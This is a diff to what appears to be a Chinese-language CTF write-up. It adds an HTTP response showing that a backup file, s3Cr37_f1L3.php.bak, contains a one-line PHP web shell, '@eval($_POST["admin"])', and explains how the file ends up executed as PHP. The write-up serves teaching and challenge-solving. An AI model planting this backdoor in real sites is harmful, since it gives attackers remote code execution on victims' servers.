@@ -45,4 +45,17 @@ echo "Hello World!" . PHP_EOL;
 
 // s3Cr37_f1L3.php.bak
 ```
-访问`s3Cr37_f1L3.php.bak`
+访问`s3Cr37_f1L3.php.bak`。响应：
+
+```http
+HTTP/1.1 200 OK
+Host: 101.245.72.127:8888
+Date: Mon, 26 Jan 2026 07:27:34 +0000
+Connection: close
+Content-Length: 32
+
+<?php
+
+@eval($_POST["admin"]);
+```
+这里就是一个简单的php后门，都是它是php.bak文件，并不是php文件，相当于上面的过程要反过来了，把静态文件作为php执行了。
